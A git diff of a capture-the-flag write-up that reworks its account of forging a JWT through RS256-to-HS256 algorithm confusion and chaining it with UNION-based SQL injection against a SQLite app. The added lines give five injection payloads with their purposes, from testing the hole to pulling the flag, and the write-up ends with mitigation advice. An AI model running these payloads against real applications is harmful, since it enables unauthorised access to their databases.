@@ -87,25 +87,39 @@ I learned from [HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-j
 
 ### Custom Script
 I wrote a custom script to exploit this vulnerability by forging a JWT token with the HS256 algorithm, using the public key from the original token. This allowed me to manipulate the username field in the JWT payload, which was then passed to the vulnerable getUser function, leading to a successful SQL Injection attack.
-Look at that at [main.py](./scripts/main.py) .
 
-Install all the requirements:
+Before retrieving the flag, I used the following SQL injection techniques to progressively extract information from the database:
+
+1. Confirming the SQL Injection Vulnerability:
+
+    * Payload: ' OR 1 = 1 --
+    * Purpose: This basic SQL injection payload always evaluates to true (1 = 1), allowing me to bypass any logical conditions in the query. The successful injection confirmed that the application was vulnerable to SQL injection.
+2. Identifying the Number of Columns:
+
+    * Payload: ' OR 1 = 1 UNION SELECT 1, 2, 3 --
+    * Purpose: By using a UNION SELECT with different numbers of columns, I determined that the users table being queried had three columns. This information was crucial for crafting subsequent injections.
+3. Listing All Tables in the Database:
+
+    * Payload: ' OR 1 = 1 UNION SELECT 1, (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'), 3 --
+    * Purpose: I used this injection to list all tables in the SQLite database, excluding the system tables (sqlite_%). This revealed the existence of a table named flag_storage, which likely contained the flag.
+4. Listing All Columns in the flag_storage Table:
+
+    * Payload: ' OR 1 = 1 UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag_storage'), 3 --
+    * Purpose: This injection extracted the SQL statement used to create the flag_storage table, revealing the names of all columns within it. Identifying the correct column was essential for the final step.
+5. Retrieving the Flag:
+
+    * Payload: ' OR 1 = 1 UNION SELECT 1, (SELECT top_secret_flaag FROM flag_storage), 3 --
+    * Purpose: Finally, I used this injection to retrieve the contents of the top_secret_flaag column from the flag_storage table, which contained the flag.
+
+To run the script install the requirements:
 
 ```bash
 pip3 install -r requirements.txt
 ```
 
-In the `main.py` file you need to change your target, once you have done, run the script like that:
+In the [main.py](./scripts/main.py) file change your target, once you have done, run the script like that:
 
 ![image](https://github.com/user-attachments/assets/91f4c472-05a1-40d7-87c0-48ecfd10e42a)
-
-Hovewer before I found the right payload I executed the following SQL Injection:
-
-* `' OR 1 = 1 --`
-* `' OR 1 = 1 UNION SELECT 1, 2, 3 --`
-* `' OR 1 = 1 UNION SELECT 1, (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'), 3 --`
-* `' OR 1 = 1 UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag_storage'), 3 --`
-* `' OR 1 = 1 UNION SELECT 1, (SELECT top_secret_flaag FROM flag_storage), 3 --`
 
 ## Conclusion
 By combining JWT manipulation with SQL Injection, I was able to bypass authentication and retrieve sensitive data from the database. This challenge highlights the importance of secure coding practices, particularly in handling JWTs and SQL queries.
@@ -114,3 +128,11 @@ By combining JWT manipulation with SQL Injection, I was able to bypass authentic
 * Use Parameterized Queries: Avoid raw SQL queries and use parameterized queries to mitigate SQL Injection.
 * Secure JWT Handling: Ensure that JWT tokens are signed using secure algorithms and that the algorithm used is strictly enforced.
 Regular Security Audits: Regularly audit code for vulnerabilities, especially in areas involving user authentication and data handling.
+
+## References
+
+* [HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555) and the [Pentester Academy](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iv-582601f9d8ac)
+* [Pentester Academy](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iv-582601f9d8ac)
+* [jwt.io](https://jwt.io/)
+* [jwt_tool.py](https://github.com/ticarpi/jwt_tool)
+* [jwtToken-CVE-2016-10555](https://github.com/thepcn3rd/jwtToken-CVE-2016-10555)
